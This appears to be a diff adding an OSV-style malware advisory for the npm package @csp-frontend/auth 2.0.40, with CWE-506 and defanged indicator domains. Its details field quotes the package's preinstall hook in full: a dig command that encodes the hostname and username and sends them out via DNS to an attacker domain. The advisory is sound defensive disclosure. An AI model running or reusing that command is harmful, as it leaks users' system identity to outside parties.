@@ -1,0 +1,60 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-0209",
+  "modified": "2026-05-27T04:32:22Z",
+  "published": "2026-05-27T04:28:41Z",
+  "summary": "Malicious code in @csp-frontend/auth (npm)",
+  "details": "Critical finding: preinstall hook contains DNS exfiltration payload. The hook executes `dig +short \"$(echo cf-$(hostname)-$(whoami) | base32 | tr -d '=' | rev).canary[.]rebind[.]fun[.]offensive[.]work\"` which captures system info (hostname, username), base32-encodes it, and exfiltrates via DNS query to an attacker-controlled canary domain. This is a classic DNS tunneling technique for data exfiltration during npm install. Publisher email matches the attack domain. Clear malicious intent - not a false positive.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@csp-frontend/auth",
+        "purl": "pkg:npm/%40csp-frontend/auth@2.0.40"
+      },
+      "versions": [
+        "2.0.40"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@csp-frontend/auth/v/2.0.40"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-0209"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-05-27T04:28:41Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "canary[.]rebind[.]fun[.]offensive[.]work",
+          "rebind[.]fun[.]offensive[.]work"
+        ]
+      }
+    }
+  }
+}
